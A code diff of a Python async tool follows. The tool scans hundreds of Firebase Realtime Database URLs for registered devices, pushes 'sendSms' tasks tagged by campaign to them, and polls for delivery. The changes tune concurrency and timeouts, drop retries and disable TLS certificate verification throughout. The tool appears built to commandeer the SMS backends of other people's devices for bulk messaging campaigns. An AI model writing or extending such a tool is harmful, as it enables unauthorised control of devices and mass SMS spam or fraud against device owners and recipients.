@@ -612,10 +612,11 @@ def _load_urls() -> list[str]:
 RTDB_URLS: list[str] = _load_urls()
 
 MAX_SMS_PER_DB   = 60     # per device
-CONCURRENT_WRITE = 200    # super fast parallel writes
+CONCURRENT_WRITE = 200
 POLL_INTERVAL    = 8
-POLL_TIMEOUT     = 300    # 5 minutes
-DISCOVER_TIMEOUT = 15     # generous for asia/europe regions
+POLL_TIMEOUT     = 300
+_DISCOVER_TIMEOUT = 10    # per-request timeout during discovery
+_DISCOVER_TOTAL   = 45   # hard wall for the whole scan
 
 
 @dataclass
@@ -637,9 +638,9 @@ async def _get(
     session: aiohttp.ClientSession,
     url: str,
     timeout: float = 8.0,
-) -> Optional[dict | bool]:
+) -> Optional[dict]:
     try:
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as r:
             if r.status == 200:
                 return await r.json(content_type=None)
     except Exception:
@@ -649,7 +650,7 @@ async def _get(
 
 async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
     try:
-        async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=8)) as r:
+        async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as r:
             return r.status in (200, 201)
     except Exception:
         return False
@@ -658,9 +659,8 @@ async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
 async def _get_devices_one(
     session: aiohttp.ClientSession,
     db_url: str,
-    timeout: float = DISCOVER_TIMEOUT,
 ) -> list[RtdbDevice]:
-    data = await _get(session, f"{db_url}/registeredDevices.json?shallow=true", timeout=timeout)
+    data = await _get(session, f"{db_url}/registeredDevices.json?shallow=true", timeout=_DISCOVER_TIMEOUT)
     if not data or not isinstance(data, dict):
         return []
     return [
@@ -670,36 +670,24 @@ async def _get_devices_one(
 
 
 async def discover_all_devices() -> list[RtdbDevice]:
-    # High connector limit so 550+ requests don't queue up and timeout
-    connector = aiohttp.TCPConnector(limit=300, limit_per_host=10)
+    # ssl=False skips cert verification — prevents SSL handshake hangs on misconfigured DBs
+    connector = aiohttp.TCPConnector(limit=300, limit_per_host=5, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        results = await asyncio.gather(
-            *[_get_devices_one(session, url) for url in RTDB_URLS],
-            return_exceptions=True,
-        )
-
-    # Collect found devices and failed URLs for retry
-    devices = []
-    failed_urls = []
-    for url, r in zip(RTDB_URLS, results):
-        if isinstance(r, list) and r:
-            devices.extend(r)
-        elif not isinstance(r, list):
-            failed_urls.append(url)
-        # empty list = DB online but no devices — skip retry
-
-    # Retry failed URLs once with longer timeout
-    if failed_urls:
-        connector2 = aiohttp.TCPConnector(limit=100, limit_per_host=5)
-        async with aiohttp.ClientSession(connector=connector2) as session2:
-            retry_results = await asyncio.gather(
-                *[_get_devices_one(session2, url, timeout=20.0) for url in failed_urls],
-                return_exceptions=True,
+        try:
+            results = await asyncio.wait_for(
+                asyncio.gather(
+                    *[_get_devices_one(session, url) for url in RTDB_URLS],
+                    return_exceptions=True,
+                ),
+                timeout=_DISCOVER_TOTAL,
             )
-        for r in retry_results:
-            if isinstance(r, list):
-                devices.extend(r)
+        except asyncio.TimeoutError:
+            results = []
 
+    devices = []
+    for r in results:
+        if isinstance(r, list):
+            devices.extend(r)
     return devices
 
 
@@ -783,18 +771,17 @@ async def poll_stats(
     campaign_tag: str,
     update_cb=None,
 ):
-    deadline    = time.time() + POLL_TIMEOUT
-    total       = len(task_log)
+    deadline   = time.time() + POLL_TIMEOUT
+    total      = len(task_log)
     done_keys: set[str] = set()
-    # Track write timestamps so we know a null means consumed (sent), not just not-yet-written
-    write_time  = time.time()
+    write_time = time.time()
 
     while time.time() < deadline:
         await asyncio.sleep(POLL_INTERVAL)
         elapsed = time.time() - write_time
 
         grand = CampaignStats(total=total)
-        connector = aiohttp.TCPConnector(limit=100)
+        connector = aiohttp.TCPConnector(limit=100, ssl=False)
         async with aiohttp.ClientSession(connector=connector) as session:
             for db_url, device_id, task_key in task_log:
                 if task_key in done_keys:
@@ -804,7 +791,7 @@ async def poll_stats(
                 rec = await _get(session, f"{db_url}/sendSms/{device_id}/{task_key}.json")
 
                 if not rec or not isinstance(rec, dict):
-                    # Record gone after >5s since write = device consumed it = sent
+                    # Record gone after 5s = device consumed it = sent
                     if elapsed > 5:
                         grand.sent += 1
                         done_keys.add(task_key)
